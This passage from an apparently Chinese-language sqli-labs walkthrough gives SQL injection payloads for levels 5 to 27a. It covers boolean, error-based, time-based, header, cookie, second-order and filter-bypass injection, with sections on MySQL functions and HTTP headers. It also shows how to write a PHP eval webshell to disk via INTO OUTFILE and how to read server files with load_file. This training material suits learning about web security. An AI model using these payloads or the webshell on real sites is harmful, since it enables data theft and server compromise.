- `?id=1' and ord(mid((select IFNULL(CAST(username AS CHAR),0x20) from security.users order by id limit 0,1) ,1,1))=68 --+`<br>
    这里检索出数据，得到users表里数据的第一个id的username列第一个字符为68即D，可逐个慢慢检索。

小结：以上通过布尔盲注得到熟悉和理解。

接下来，使用报错型和延时盲注。


- 首先证实存在报错型盲注漏洞：<br>
    `?id=1' union Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+`

    Duplicate entry '::root@localhost::1' for key 'group_key'

- 利用double数值类型溢出报错注入：<br>
    `?id=1' union select 1,2,exp(~(select * from (select user())a))--+`
    
    DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'

- 利用bigint溢出报错注入：<br>
    `?id=1' union select 1,2,!(select * from (select user())a) - ~0--+`

    BIGINT UNSIGNED value is out of range in '((not((select 'root@localhost' from dual))) - ~(0))'

- xpath报错——extractvalue检查函数<br>
    `?id=1' and extractvalue(1,concat(0x7e,(select @@version),0x7e))--+`
    
    XPATH syntax error: '~5.6.17~'

    这里@@version可以用version()替换。extractvalue()表示对xml的检查函数。
    
- xpath报错——updatexml修改函数<br>
    `?id=1' and updatexml(1,concat(0x7e,(select @@version),0x7e),1)--+`

    XPATH syntax error: '~5.6.17~'
    
    这里@@version可以用version()替换。extractvalue()表示对xml的修改函数。

- 利用数据的重复性
    
    `?id=1'union select 1 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x --+`

    Duplicate column name '5.6.17'
    
    这里利用name_const()函数的列重复性报错。
    
    > 补充说明：**NAME_CONST(name,value)**<br>
    返回给定值。当用于产生结果集列时，NAME_CONST()使该列具有给定的名称。参数应为常量。<br>
    当然，对于应用程序可以使用简单的as别名，效果完全相同。<br>
    `mysql> SELECT NAME_CONST('myname', 14);`<br>
    结果如下：
    
    | myname |
    |--------|
    |     14 |
    
- 延时注入——sleep()函数
    
    `?id=1' and if(ascii(substr(database(),1,1))!=115,1,sleep(5))--+`

    这里利用sleep()函数进行延时注入，115是s，此时会有5秒的延迟返回。
    
- 延时注入——BENCHMARK()函数
    
    `?id=1' union select (if(substr(current,1,1)=char(115),benchmark(50000000,encode('msg','msg_pass')),null)),2,3 from  (select database() as current) as tb1--+`

    BENCHMARK()循环操作n次。
    
    
### Less-6
    
这里Less-6是和5差不多的，只是在id引用换为双引号。

直接给出payload：

`?id=1" and left(version(),1)=4--+`

    
```php
    $sql = "      "
    select * from users where id = " 1" and left(@@version,1)=5 #  " limit 0,1
```
    
#### **注意：单引号和双引号不能混用！！**

    
# 六、Background-3 导入导出相关操作的讲解

### 1. load_file()导出文件

load_file(file_name):读取文件并返回该文件的内容作为一个字符串。

使用条件：

A.必须有权限读取并且文件必须完全可读
> * and (select count(*) from mysql.user)>0/* 如果结果返回正常,说明具有读写权限。<br>
> * and (select count(*) from mysql.user)>0/* 返回错误，应该是管理员给数据库帐户降权了。

B.欲读取文件必须在服务器上<br>
C.必须指定文件完整的路径<br>
D.欲读取文件必须小于max_allowed_packet<br>

若文件不存在或读取失败，load_file()函数返回空。

MySQL注入load_file常用路径：<https://www.cnblogs.com/lcamry/p/5729087.html>

> EG：
> 1. Select 1,2,3,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92,114,101,112,97,105,114,92,115,97,109))))<br>
利用hex()将文件内容导出来，尤其是smb文件时可以使用。
> 2. -1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))<br>
Explain：“char(99,58,47,98,111,111,116,46,105,110,105)”就是“c:/boot.ini”的ASCII 代码
> 3. -1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69)<br>
Explain：“c:/boot.ini”的16 进制是“0x633a2f626f6f742e696e69”
> 4. -1 union select 1,1,1,load_file(c:\\boot.ini)<br>
Explain:路径里的/用\\代替

### 2. 文件导入到数据库

LOAD DATA INFILE 语句用于高速地从一个文本文件中读取行，并装入一个表中。文件名称必
须为一个文字字符串。

函数具体介绍请参考mysql文档。
```sql
LOAD DATA [LOW_PRIORITY | CONCURRENT] [LOCAL] INFILE 'file_name'
    [REPLACE | IGNORE]
    INTO TABLE tbl_name
    [PARTITION (partition_name,...)]
    [CHARACTER SET charset_name]
    [{FIELDS | COLUMNS}
        [TERMINATED BY 'string']
        [[OPTIONALLY] ENCLOSED BY 'char']
        [ESCAPED BY 'char']
    ]
    [LINES
        [STARTING BY 'string']
        [TERMINATED BY 'string']
    ]
    [IGNORE number {LINES | ROWS}]
    [(col_name_or_user_var,...)]
    [SET col_name = expr,...]
```

### 3. 导入到文件

SELECT.....INTO OUTFILE 'file_name'

将选择行写入到文件中，被创建到服务器上（注意须有权限，且文件尚未存在）。一般有两种形式：

1. 第一种形式是将select导入到文件中
> EG:<br>
Select version() into outfile "c:\\test.txt";
<br>
替换成“一句话木马”(`<?php @eval($_post[“mima”])?>`)也可以<br>
Select <?php @eval($_post[“mima”])?> into outfile “c:\\webdir\\test.php”

2. 第二种形式是修改文件结尾

> Select version() Into outfile “c:\\phpnow\\htdocs\\test.php” LINES TERMINATED BY 0x16 进制文件

> 16 进制可以为"一句话木马"或者其他任何的代码，可自行构造。

> 在sqlmap 中os-shell 采取的就是这样的方式，具体可参考os-shell 分析文章：<http://www.cnblogs.com/lcamry/p/5505110.html>

**TIPS:**<br>
（1）可能在文件路径当中要注意转义，这个要看具体的环境。<br>
（2）上述我们提到了load_file(),但是当前台无法导出数据的时候，我们可以利用下面的语句：<br>
`select load_file(‘c:\\wamp\\bin\\mysql\\mysql5.6.17\\my.ini’)into outfile 'c:\\wamp\\www\\test.php'`

可以利用该语句将服务器当中的内容导入到web 服务器下的目录，这样就可以得到数据了。上述my.ini 当中存在password 项（不过默认被注释），当然会有很多的内容可以被导出来，这个要平时积累。


# 七、答题模式-Background-3 导入导出相关操作的讲解-Less-7~16

### Less-7

源码：<br>
`$sql="SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1";`

首先我们先正常输入id值，得到正常的输出。再构造语句：
`?id=1')) union select 1,2,3 into outfile 'c:\\wamp\\www\\test000.txt'--+`

这里输出You have an error in your SQL syntax。显示sql出错，但是没有关系，文件已经生成了。

此时，同样可以构造“一句话木马”导入进去。

`?id=1')) union select 1,2,"<?php @eval($_post['a'])?>" into outfile 'c:\\wamp\\www\\test.php'--+`

然后就是菜刀getshell的后续操作了。


### Less-8

这里是 `?id=10' or 1=1--+` 进行注入，查看源码是屏蔽了mysql_error()，无法使用报错型注入，其他payload参考Less-5。


### Less-9

标题为 Blind- Time based- Single Quotes- String《基于时间-单引号》，显然是利用延时注入。

直接一层 `?id=1' or 1=1--+` 得到正常输出

这里开始利用sleep()延时注入。

- 猜测数据库：<br>
`?id=1' and if(ascii(substr(database(),1,1))=115,1,sleep(5))--+`<br>
sql构造为当数据库名第一位字母为ascii(s)=115，if正确则立即返回，不正确则等待5秒钟。<br>
修改substr参数得到第二个字母，以此类推得到数据库名称是security。
- 猜测security数据表：<br>
`if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=101,1,sleep(5))--+`<br>
这里猜的第一张数据表的第一个字母为ascii(e)=101，if正确则立即返回，不正确则等待5秒钟。<br>
修改limit参数可得到第二张表，修改substr参数可得到表全名，以此类推得到所有数据表emails,referers,uagents,users。
- 猜测users表的列<br>
`?id=1' and if(ascii(substr((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),1,1))=105,1,sleep(5))--+`<br>
这里猜得users表的第一列为ascii(i)=105。<br>
以此类推，得到列名是id,username,password。
- 猜测username值
`?id=1' and if(ascii(substr((select username from security.users limit 0,1),1,1))=68,1,sleep(5))--+`<br>
这里得到username第一行的第一位。<br>
以此类推，可得到username/password所有内容。

当然，这里还可以使用benchmark()函数进行注入，这里不进行演示。


### Less-10

标题是《基于时间-双引号》，和Less-9类似，查看源码可知，不管sql对错的前端显示都是一样的，因此延时类注入是适合的，此处只做一个演示。

`?id=1" and if((ascii(substr(user(),1,1))=65),1,sleep(5))--+`<br>
延时5秒，所以用户第一位不是65A。


### Less-11

这里是初次接触POST注入，是一个登陆入口。

首先用hackbar的load url可以提取到需要post的数据。

再第一步就是测试万能密码 `admin' or '1'='1`，密码随意。<br>
构造出来的payload是这样的 `uname=admin' or '1'='1#&passwd=1`<br>

显示是登录成功的，登录账号为admin密码为admin。<br>
通过查看后端代码，构造出的sql是这样的：`@$sql="SELECT username, password FROM users WHERE username='admin'or'1'='1# and password='$passwd' LIMIT 0,1";`

这里利用的是 or 恒成立。


> ps：这里个人再深入一层，加入我不清楚存在admin账号，我就试举例构造 `a' or 1=1--+` ，密码随意<br>
得到的结果是登录账号Dumb登录密码Dumb，显示是登录成功的。<br>
那么我即使不知道账号也能绕过去，并且可以得到前端提示的一个用户。

接着天书的指引，我们用union注入尝试：<br>
`passwd=1&uname=1admin' union select 1,database()--+`

那么前端回显的是database为security。这种叫get注入，是常用的手法，还有其他方法注入，天书在后面的关卡会给示例。


### Less-12

这里Less-12和Less-11类似，只不过在sql语句上多了一弯口。

首先构造单/双引号，在构造双引号后得到提示是 `")` 。

知道这点之后payload就简单了：<br>
`passwd=1&uname=admin")--+` 得admin/admin<br>
`passwd=1&uname=1admin") or 1=1--+`得Dump/Dump


### Less-13

这里我们输入 `admin'` ，会看到报错是对id进行了 `')` 处理。

根据前面的方式绕过，登录成功后是没有回显登录成功的用户名的。只是显示登录结果，那么这里我们就用下布尔类型的盲注了。

猜测数据库的第一位：<br>
`passwd=1&uname=admin') and left(database(),1)>'a'--+`

> 注意这里我们使用的是and，是利用了uname=admin的。

这里猜测后是登录成功的，接下来就可以逐位猜测了，如Less-5。提一个小建议，在逐位猜测的过程可以利用二分法。


### Less-14

这里直接测试<br>
`passwd=1&uname=admin" and left(database(),1)>'a'--+` 

可见是登录成功的，没有登录提示。那么这里利用一下报错注入：<br>
`passwd=1&uname=admin" and extractvalue(1,concat(0x7e,(select version()),0x7e))--+`

这里就提示了：XPATH syntax error: '~5.6.17~'


### Less-15

本关卡没有报错提示，只能猜测注入，可看源码得知id进行了 `'id'` 的处理。

这里我们利用延时注入，猜测数据库名第一位：<br>
`passwd=1&uname=admin' and if(ascii(substr(database(),1,1))=115,1,sleep(5))--+`

正确的时候可以直接登录，不正确的时候延时5秒且登录失败。


### Less-16

本关卡和Less-15的处理是一样的，同样的使用延时注入的方法进行解决。多次猜测或从源码中可知，进行了 `("id")` 的处理。

构造payload：<br>
`passwd=1&uname=1admin") or 1=1--+` 登录成功<br>

**技巧**：注意这里，假如不知道存在的账号，也可以构造or语句。<br>
`passwd=1&uname=1admin")  or if(ascii(substr(database(),1,1))=114,1,sleep(5))--+`<br>
这里账号为1admin，再借用or语句得1或延时注入，均可得到登录成功、数据库名第一位为115s、立即响应或休眠5秒的结果。

> ps：优先级 and > or


# 八、Background-4 增删改函数介绍

在对数据进行处理上，我们常用的是增删查改。查就是上述总用到的select，接下来讲解mysql的增删改。

### 增加 Insert

官方文档 help insert 得到：
```sql
INSERT [LOW_PRIORITY | DELAYED | HIGH_PRIORITY] [IGNORE]
    [INTO] tbl_name
    [PARTITION (partition_name,...)]
    [(col_name,...)]
    {VALUES | VALUE} ({expr | DEFAULT},...),(...),...
    [ ON DUPLICATE KEY UPDATE
      col_name=expr
        [, col_name=expr] ... ]
...
```

> 简单举例：<br>
`insert into users values('16','1camry','1camry')`

### 删除 delete drop 

- 删除数据：<br>
detele from 表名;<br>
delete from 表名 where id=1;
- 删除结构：<br>
删数据库：drop database 数据库名;<br>
删除表：drop 表名;<br>
删除表中的列：alter table 表名 drop column 列名;<br>

> 简单举例：<br>
delete from users where id=16;


### 修改

- 修改所有：update 表名 set 列名='新的值，非数值加单引号';
- 带条件的修改：update 表名 set 列名='新的值，非数字加单引号' where id=6;


# 九、答题模式-Less-17

### Less-17

首先猜测构造payload注入点，测试得知在password中作故事，当在passwd后加单引号得到前端报错提示。

这里就可以展开报错型注入了，如：`uname=admin4&passwd=admin4' and extractvalue(1,concat(0x7e,(select @@version),0x7e))--+`

这里就可以将@@version换成你的子句就可以进行其他注入了。

当然了，也可以说用延时中注入，如：`uname=admin4&passwd=11'and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+`

这里其他方式就不在进行演示了，可以自行思考哦。但是需要注意的是，原后端的sql语句是： `$update="UPDATE users SET password = '$passwd' WHERE username='$row1'";` ，在进行报错型注入的时候注意不一定能使用相关的select。

#### 指引思考：为什么我们不在username处进行构造呢？

从源码中，先是select了语句，但是该sql有checkkk_input()函数。

```php
function check_input($value){
    if(!empty($value))
        {
        // truncation (see comments)
        $value = substr($value,0,15);
        }
        // Stripslashes if magic quotes enabled
        if (get_magic_quotes_gpc())
            {
            $value = stripslashes($value);
            }
        // Quote if not a number
        if (!ctype_digit($value))
            {
            $value = "'" . mysql_real_escape_string($value) . "'";
            }
    else
        {
        $value = intval($value);
        }
    return $value;
}
```

这里我们介绍几个函数你就明白了。

- ##### addslashes()
addslashes()函数返回在预定义字符之前添加反斜杠的字符串。

预定义字符是：
1. 单引号（'）
2. 双引号（"）
3. 反斜杠（\）
4. NULL

提示：该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。

> 注释：默认地，PHP 对所有的GET、POST 和COOKIE 数据自动运行addslashes()。所以您不应对已转义过的字符串使用addslashes()，因为这样会导致双层转义。遇到这种情况时可以使用函数get_magic_quotes_gpc() 进行检测。

语法：addslashes(string)
参数 | 描述
---- | ----
string | 必需。规定要转义的字符串。
返回值 | 返回已转义的字符串。
php版本 | 4+


- ##### stripsslashes()
函数删除由addslashes()函数添加的反斜杠。

- ##### mysql_real_escape_string()
函数转义sql语句中使用的字符串中的特殊字符。

下列字符受影响：
1. \x00
2. \n
3. \r
4. \
5. '
6. "
7. \x1a

如果成功，则该函数返回被转义的字符串。如果失败，则返回false。

语法：mysql_real_escape_string(string, connection)
参数 | 描述
---- | ----
string     | 必需。规定要转义的字符串。
connection | 规定mysql链接。如果未规定，则使用上一个连接。

说明：本函数将string中的页数字符转义，并考虑到连接的当前字符集，因此可以安全用于mysql_query()。

在Less-17的check_input()中，对username进行各种转义的处理，所以此处不能使用username进行注入。



# 十、Background-5 HTTP头部介绍

1. **Accept**：告诉WEB服务器自己接受什么介质类型， \*/* 表示任何类型，type/*表示该类型下所有子类型，type/sub-type。
2. **Accept-Charset**：浏览器申明目己接收的字符集<br>
**Accept-Encoding**：浏览器申明目己接收的编码方法，通常指定压缩方法，是否支持压缩，支持什么压缩方法（gzip，deflate）<br>
**Accept-Language**：浏览器甲明目已按收的语言<br>
语言跟字符集的区别：中文是语言，中文有多种字符集，比如big5，gb2312，gbk等等。
3. **Accept-Ranges**: WEB服务器表明自己是否接受获取其某个实体的一部分（比如文件的一部分）的请求。bytes：表示接受，none：表示不接受。
4. **Age**：当代理服务器用目己缓存的实体去响应请求时，用该头部表明该实体从产生到现在经过多长时间了。
5. **Authorization**：当客户端接收到来自WEB服务器的wwW-Authenticate响应时，用该头部来回应自己的身份验证信息给WEB服务器。
6. **Cache-Control**：<br>
请求：<br>
no-cache（不要缓存的实体，要求现在从WEB服务器去取）<br>
max-age:（只接受Age值小于max-age值，并且没有过期的对象）<br>
max-stale:（可以接受过去的对象，但是过期时间必须小于max-stale值）<br>
min-fresh:（接受其新鲜生命期大于其当前Age跟min-fresh值之和的缓存对象）<br>
响应：<br>
public（可以用Cached内容回应任何用户）<br>
private（只能用缓存内容回应先前请求该内容的那个用户）<br>
no-cache（可以缓存，但是只有在跟WEB服务器验证了其有效后，才能返回给客户端）<br>
max-age:（本响应包含的对象的过期时间）<br>
ALL:no-store（不允许缓存）
7. **Connection**：<br>
请求：<br>
close（告许WEB服务器或者代理服务器，在完成本次请求的啊应后，断开连接，不要等待本次连接的后续请求了）。<br>
keepalive（告诉WEB服务器或者代理服务器，在完成本次请求的响应后，保持连接，等待本次连接的后续请求）。<br>
响应：<br>
close（连接已经关闭）。<br>
keepalive（连接保持着，在等待本次连接的后续请求）。<br>
Keep-Alive：如果浏览器请求保持连接，则该头部表明希望WEB服务器保持连接多长时间（秒）。例如：Keep-Alive：300
8. **ontent-Encoding**：WEB服务器表明自己使用了什么压缩方法（gzip，deflate）压缩响应中的对象。例如：Content-Encoding：gzip
9. **Content-Language**：WEB服务器告诉浏览器自己响应的对象的语言。
10. Content-Length： WEB服务器告诉浏览器自己响应的对象的长度。例如：Content-Length:
26012
11. **Content-Range**： WEB服务器表明该响应包含的部分对象为整个对象的哪个部分。例如：Content-Range: bytes 21010-47021/47022
12. **Content-Type**： WEB服务器告诉浏览器自己响应的对象的类型。例如：Content-Type：application/xml
13. **ETag**：就是一个对象（比如URL）的标志值，就一个对象而言，比如一个html 文件，如果被修改了，其Etag 也会别修改，所以ETag 的作用跟Last-Modified 的作用差不多，主要供WEB服务器判断一个对象是否改变了。比如前一次请求某个html 文件时，获得了其ETag，当这次又请求这个文件时，浏览器就会把先前获得的ETag 值发送给WEB 服务器，然后WEB 服务器会把这个ETag 跟该文件的当前ETag 进行对比，然后就知道这个文件有没有改变了。
14. **Expired**：WEB 服务器表明该实体将在什么时候过期，对于过期了的对象，只有在跟
WEB 服务器验证了其有效性后，才能用来响应客户请求。是HTTP/1.0 的头部。例如：Expires：Sat, 23 May 2009 10:02:12 GMT
15. **Host**：客户端指定自己想访问的WEB 服务器的域名/IP 地址和端口号。例如：Host：rss.sina.com.cn
16. **If-Match**：如果对象的ETag 没有改变，其实也就意味著对象没有改变，才执行请求的动作。
17. **If-None-Match**：如果对象的ETag 改变了，其实也就意味著对象也改变了，才执行请求的动作。
18. **If-Modified-Since**：如果请求的对象在该头部指定的时间之后修改了，才执行请求的动作（ 比如返回对象）， 否则返回代码304 ，告诉浏览器该对象没有修改。例如：If-Modified-Since：Thu, 10 Apr 2008 09:14:42 GMT
19. **If-Unmodified-Since**：如果请求的对象在该头部指定的时间之后没修改过，才执行请求
的动作（比如返回对象）。
20. **If-Range**：浏览器告诉WEB 服务器，如果我请求的对象没有改变，就把我缺少的部分给我，如果对象改变了，就把整个对象给我。浏览器通过发送请求对象的ETag 或者自己所知道的最后修改时间给WEB 服务器，让其判断对象是否改变了。总是跟Range 头部一起使用。
21. **Last-Modified**：WEB 服务器认为对象的最后修改时间，比如文件的最后修改时间，动态页面的最后产生时间等等。例如：Last-Modified：Tue, 06 May 2008 02:42:43 GMT
22. **Location**：WEB 服务器告诉浏览器，试图访问的对象已经被移到别的位置了，到该头部指定的位置去取。例如： Location ： http://i0.sinaimg.cn/dy/deco/2008/0528/sinahome_0803_ws_005_text_0.gif
23. **Pramga**：主要使用Pramga: no-cache，相当于Cache-Control： no-cache。例如：Pragma：no-cache
24. **Proxy-Authenticate**： 代理服务器响应浏览器，要求其提供代理身份验证信息。<br>
Proxy-Authorization：浏览器响应代理服务器的身份验证请求，提供自己的身份信息。
25. **Range**：浏览器（比如Flashget 多线程下载时）告诉WEB 服务器自己想取对象的哪部分。例如：Range: bytes=1173546-
26. **Referer**：浏览器向WEB 服务器表明自己是从哪个网页/URL 获得/点击当前请求中的网址/URL。例如：Referer：http://www.sina.com/
27. **Server**: WEB 服务器表明自己是什么软件及版本等信息。例如：Server：Apache/2.0.61 (Unix)
28. **User-Agent**: 浏览器表明自己的身份（是哪种浏览器）。例如：User-Agent：Mozilla/5.0(Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.14) Gecko/20080404 Firefox/2、0、0、14
29. **Transfer-Encoding**: WEB 服务器表明自己对本响应消息体（不是消息体里面的对象）作了怎样的编码，比如是否分块（chunked）。例如：Transfer-Encoding: chunked
30. **Vary**: WEB 服务器用该头部的内容告诉Cache 服务器，在什么条件下才能用本响应所返回的对象响应后续的请求。假如源WEB 服务器在接到第一个请求消息时，其响应消息的头部为：Content- Encoding: gzip; Vary: Content-Encoding 那么Cache 服务器会分析后续请求消息的头部，检查其Accept-Encoding，是否跟先前响应的Vary 头部值一致，即是否使用相同的内容编码方法，这样就可以防止Cache 服务器用自己Cache 里面压缩后的实体响应给不具备解压能力的浏览器。例如：Vary：Accept-Encoding
31. **Via**： 列出从客户端到OCS 或者相反方向的响应经过了哪些代理服务器，他们用什么协议（和版本）发送的请求。当客户端请求到达第一个代理服务器时，该服务器会在自己发出的请求里面添加Via 头部，并填上自己的相关信息，当下一个代理服务器收到第一个代理服务器的请求时，会在自己发出的请求里面复制前一个代理服务器的请求的Via 头部，并把自己的相关信息加到后面，以此类推，当OCS 收到最后一个代理服务器的请求时，检查Via 头部，就知道该请求所经过的路由。例如：Via：1.0 236.D0707195.sina.com.cn:80(squid/2.6.STABLE13)

推荐使用工具：live http headers(插件)


# 十一、答题模式-Less-18~22

### Less-18
本关我们这里从源代码直接了解到

    $uname = check_input($_POST['uname']);
    $passwd = check_input($_POST['passwd']);

对uanem和passwd进行了check_input()的处理，所以我们在这里的输入进行注入是不行的，但是在代码中，我们看到了insert()

    $insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";
    
将useragent和ip插入到数据库中，那么我们可以从这里入手。注意判断逻辑，这里需要输入正确的账号密码才能执行insert语句。
    
那么我们在hackbar中添加头部信息，将user-agent修改为

    ' and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and '1'='1

得到：

    Your IP ADDRESS is: 127.0.0.1
    Your User Agent is: ' and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and '1'='1
    XPATH syntax error: '~5.6.17~'

这里可以看到我们已经得到前端显示的版本号了，注入成功，其余请自行发散思维思考。


### Less-19

从源代码中我们可以看到我们获取到的是HTTP_REFERER，和Less-18是基本一直的，这里对referer进行修改。

将referer修改为：`' and extractvalue(1,concat(0x7e,(select @@basedir),0x7e)) and '1'='1`

得到：

    Your IP ADDRESS is: 127.0.0.1
    Your Referer is: ' and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and '1'='1
    XPATH syntax error: '~5.6.17~'

### Less-20

可以从源代码中看到，当登录后的再次刷新时，会从cookie中读取uname，然后再执行sql查询语句。

那么我们可以在登录成功后，修改cookie，再进行刷新时，这时候sql语句会被修改。

在chrome的network中可以得到cookie的值，普通登录后为 `uname=admin` ，我们将其修改为：

    uname=admin1' and extractvalue(1,concat(0x7e,(select @@basedir),0x7e)) --+

可以看到，前端提示了mysql的路径，表明注入成功。

> 注意：登录成功后的刷新不需要post账号密码，服务器会先判断cookie即可登录。

### Less-21

本关卡对cookie进行了base64的处理，其他的处理流畅和Less-20是一样的。

cookie:
    
    uname=YWRtaW4xJylhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBAQGJhc2VkaXIpLDB4N2UpKSM= 
    
得到：

    YOUR USER AGENT IS : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
    YOUR IP ADDRESS IS : 127.0.0.1
    DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE 
    YOUR COOKIE : uname = YWRtaW4xJylhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBAQGJhc2VkaXIpLDB4N2UpKSM= and expires: Tue 26 Nov 2019 - 10:03:40
    Issue with your mysql: XPATH syntax error: '~c:\wamp\bin\mysql\mysql5.6.17\~'    

这里我们得到了mysql的路径，其他方法自行思考。


### Less-22

本关卡和Less-20、Less-21是一致的，从源代码中仔细可以看出对value进行了“value”的处理，可以构造payload，在hackbar中添加header:

    uname=admin1" and extractvalue(1,concat(0x7e,(sellect database()),0x7e))--+

将uname后的string进行base64 encode提交，前端显示：


    YOUR USER AGENT IS : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
    YOUR IP ADDRESS IS : 127.0.0.1
    DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE 
    YOUR COOKIE : uname = YWRtaW4xImFuZCBleHRyYWN0dmFsdWUoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpKSM= and expires: Tue 26 Nov 2019 - 10:23:49
    Issue with your mysql: XPATH syntax error: '~security~'
    
可以看到数据库名为security了，其他payload请自行发散思维进行构造。


# 十二、第二部分__page-2 Advacned injection Less-23~28a

### Less-23

sql语句为 `$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1"; ` ，此处主要是在获取Id参数时候进行了 # -- 注释符号的过滤。

Solution: 

    ?id=-1' union select 1,@@datadir,'3
    # 此处构造payload后此时的sql语句为：
    SELECT * FROM users WHERE id='-1' union select 1,@@datadir,'3' limit 0,1
    # 此时前端输出了数据库路径，注入成功
    
讲解：
1. 首先使用id=-1，因为前端只输出一个select的数据，为了注出，一个select要没有结果，然后输出我们注出的数据，那就id=-1或者超过数据库数据都行。
2. 这里要注意的是单引号的闭合问题： `  1' union select 1,@@datadir,'3  `。
3. 此处可以进行报错注入、延时注入，可以利用 or '1'='1 进行闭合，这里不进行示例。

将@@datadir修改为其他内容，以下用联合注入方法进行。

- 获取数据库
```sql
    ?id=-1' union select 1,(select group_concat(schema_name) from  information_schema.schemata),'3
```
这里获取到所有的数据库名，从database()可以知道当前数据库为security。

- 查看数据表
```sql
    ?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),'3
```
此时会得到所有表名：emails,referers,uagents,users

- 查看表所有列
```sql
    ?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),'3
```
此时会得到该表的所有列：id,username,password

- 获取内容
```sql
    ?id=-1' union select 1,(select group_concat(username) from security.users limit 0,1),'3
```
这里会获得username列的所有内容：Dumb,Angelina,Dummy,secure,stupid...

    
### Less-24

本关为**二次排序注入**的示范例。二次排序注入也成为存储型的注入，就是将可能导致sql 注入的字符先存入到数据库中，当再次调用这个恶意构造的字符时，就可以触发sql 注入。

二次排序注入思路：
1. 黑客通过构造数据的形式，在浏览器或者其他软件中提交HTTP 数据报文请求到服务端进行处理，提交的数据报文请求中可能包含了黑客构造的SQL 语句或者命令。
2. 服务端应用程序会将黑客提交的数据信息进行存储，通常是保存在数据库中，保存的数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响应。
3. 黑客向服务端发送第二个与第一次不相同的请求数据信息。
4. 服务端接收到黑客提交的第二个请求信息后，为了处理该请求，服务端会查询数据库中已经存储的数据信息并处理，从而导致黑客在第一次请求中构造的SQL 语句或者命令在服务端环境中执行。
5. 服务端返回执行的处理结果数据信息，黑客可以通过返回的结果数据信息判断二次注入漏洞利用是否成功。

> EG: 此例子中我们的步骤是注册一个admin’#的账号，接下来登录该帐号后进行修改密码，注入修改的就是admin 的密码。

步骤演示：
1. users初始数据库为：

账号 | 密码
---- | ----
admin | 0

2.注册账号，注册账号页面填写账号：`admin'#` ，注册后数据库为：

账号 | 密码
---- | ----
admin   | 0
admin'# | 123

3. 登录admin'#，进入修改页面，修改密码为1，前端返回修改成功，此时数据库为：

账号 | 密码
---- | ----
admin   | 1
admin'# | 123

> 结论：可见，二次排序注入成功。

** 思考——从源代码中思考为什么能注入成功？ **

首先在注册页面，在注册页面里有 `$username=  mysql_escape_string($_POST['username']) ;` 该语句存在，表示对username进行转义。

    # 那么执行注册的真实查重sql语句是这样的：
    select count(*) from users where username='admin\'#'

然后，在修改页面中有 `$username= $_SESSION["username"];` 该语句存在，表示username从Session获得，前端页面输入的密码均会进行 `mysql_real_escape_string()` 函数转义特殊字符。

    # 因此，这里获得后执行的真实语句是这样的：
    UPDATE users SET passwd="New_Pass" WHERE username ='admin'#' and password='$curr_pass' "; 
    
该语句引号闭合、注释都是完美的，所以能够注入成功。


### Less-25

本关卡主要为 or and 过滤。一般性提供一下几种思路：

1. 大小写变形 Or OR oR
2. 编码，hex urlencode
3. 添加注释 /* or */
4. 利用符号 and=&& or=||

本关卡示例报错payload: 

    ?id=1' || extractvalue(1,concat(0x7e,database()))--+
    

### Less-25a
    
不同于Less-25关的是sql语句没有的id进行 ' ' 处理，同时没有输出错误项，因此报错注入不能用。

其余基本上和Less-25示例没有差别，此处采用两种方式：延时注入和联合注入。

    # 示范联合注入：
    ?id=-1 union select 1,@@basedir,3--+
    # 示范or=||，这里输入limit的第一条记录
    ?id=2000 || 1=1 --+
    # 省略延时注入
    
    
### Less-26

TIPS: 本关卡在wamp下可能会存在apache解析问题，在linux则是正常。

本关卡结合Less-25，将 空格,or,and,/*,#,--,/ 等各种符号过滤。

对于 and,or 的方法同上。<br>
对于注释和结尾符此处我们只能构造闭合引号。<br>
对于空格：
1. %09 TAB键（水平）
2. %0a 新建一行
3. %0c 新的一页
4. %0d return功能
5. %0b TAB键（垂直）
6. %a0 空格

首先给出一个简单的payload: 

    ?id=2000'%0a||%0a'1'='1  => ?id=2000' or '1'='1'
    ?id=2000'%0a||'1 => ?id=2000' or '1'
    
这个理解应该不难。其他构造payload在不改变原sql基础上可以利用报错注入或延时注入等继续深层研究。

### Less-26a

本关卡与Less-26的区别在于sql语句的处理上，这里的处理是 `id=('$id')` 。因为前端不输出sql错误，所以排除报错注入。

这里示范使用union注入（注意此示范在wamp部署上是解析失败的）构造payload:

    id=2000')union%a0select%0a1,user(),('3
    # 等价于
    $sql = select * from users where id=('2000') union select 1,user(),('3') limit 0,1;

    
### Less-27

本关卡主要考察 union,select 和Less-26过滤的字符。

此处我们利用空格替换和大小写混合突破，示例payload:

    ?id=2000'unIon%a0SelEcT%a01,database(),3||'1
    # 注意后面的3||'1'会判断输出布尔值1
    

### Less-27a

本关卡与Less-27的区别在于对id处理，这里是 `"id"` ，同时mysql报错不会回显，示例payload:

